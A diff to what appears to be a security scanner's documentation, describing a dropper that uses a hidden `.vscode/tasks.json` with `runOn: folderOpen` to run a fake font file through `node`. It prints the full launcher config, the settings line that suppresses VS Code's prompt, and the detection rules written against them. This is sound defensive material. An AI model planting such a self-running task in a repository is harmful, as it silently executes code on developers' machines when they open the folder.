@@ -276,6 +276,58 @@ In the cleanup PR the two get different treatment: the dropper files are
 Deletion is restricted to those exact filenames, so the PR can never be talked
 into removing anything else.
 
+**Editor and CI config that executes on its own**
+
+The dropper's actual execution primitive. A repository can ship a
+`.vscode/tasks.json` that runs a shell command the moment the folder is opened:
+
+```json
+{ "label": "eslint-check",
+  "command": "(command -v node >/dev/null 2>&1 && node ./assets/public/fonts/fa-solid-900.woff2) || (where node >nul 2>&1 && node ./assets/public/fonts/fa-solid-900.woff2) || echo ''",
+  "isBackground": true, "hide": true,
+  "presentation": { "reveal": "never", "echo": false, "close": true },
+  "runOptions": { "runOn": "folderOpen" } }
+```
+
+No build, no install, no click — opening the folder is enough. `hide`,
+`reveal: never` and `echo: false` mean no terminal ever appears, and the
+`||` chain covers macOS, Linux and Windows in one line. A matching
+`.vscode/settings.json` sets `"task.allowAutomaticTasks": true`, which removes
+the prompt VS Code would otherwise show.
+
+Three rules cover it:
+
+| Rule | Fires on |
+| --- | --- |
+| `vscode-task-runs-on-folder-open` | `"runOn": "folderOpen"` — **only** inside `.vscode/tasks.json` |
+| `vscode-automatic-tasks-allowed` | `"task.allowAutomaticTasks": true` — **only** inside `.vscode/settings.json` |
+| `interpreter-runs-data-file` | `node`/`python`/`deno`/`bun`/`ruby`/`perl`/`osascript` invoked on a `.woff2`, `.ttf`, `.png`, `.pdf`, `.bin`… — **anywhere** |
+
+That third rule is the durable one. Interpreters ignore file extensions, so
+`node something.woff2` executes that file as JavaScript whatever it is called.
+It is deliberately unscoped, because the same trick works from an npm
+`postinstall`, a CI workflow or a shell script.
+
+**These files were previously invisible.** `.vscode/tasks.json` is JSON, and
+`.json` is not in `SCAN_EXTENSIONS` — the scanner never opened it. In scope now:
+
+- `.vscode/*.json` and `.devcontainer/*.json` at any depth
+- `.github/workflows/*.yml` / `*.yaml` — workflows execute on push, same class
+
+All three also raise a push alert, matched by **path** rather than basename:
+`tasks.json` on its own is far too generic a name to watch globally, so
+`src/tasks.json` is ignored while `.vscode/tasks.json` is not.
+
+The local check reports the same thing on disk, which is where it matters most
+— by the time such a file is in your working tree, opening the folder is all it
+takes.
+
+> A note on filenames: the payload here was `fa-solid-900.woff2`, which is a
+> **legitimate** Font Awesome name. It cannot go on the known-dropper list
+> without flagging every real Font Awesome install. Only the header check and
+> the task command catch this one — which is why detection cannot rest on
+> filenames alone.
+
 **Disguised assets**
 
 The rules are text-only and binary files are skipped, so a payload renamed to
